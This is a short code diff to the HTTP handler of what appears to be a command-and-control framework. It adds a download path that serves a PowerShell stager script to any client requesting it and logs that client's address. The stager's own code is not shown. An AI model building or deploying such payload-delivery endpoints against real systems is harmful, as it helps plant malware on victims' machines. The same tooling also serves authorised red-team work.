@@ -56,7 +56,12 @@ def HTTPDFactory(config):
             self.return_data()
             
         def do_GET(self):
-            Log.log_error("Invalid request got a GET request", self.path)
+            path = self.path.split("/")[-1]
+            if path == self.config.get("http-download-path"):
+                Log.log_event("Download", "PowerShell stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
+                self.output = Utils.load_powershell_script("stager.ps1", 29)
+            else:
+                Log.log_error("Invalid request got a GET request", self.path)
             self.return_data()
             
         def return_data(self):
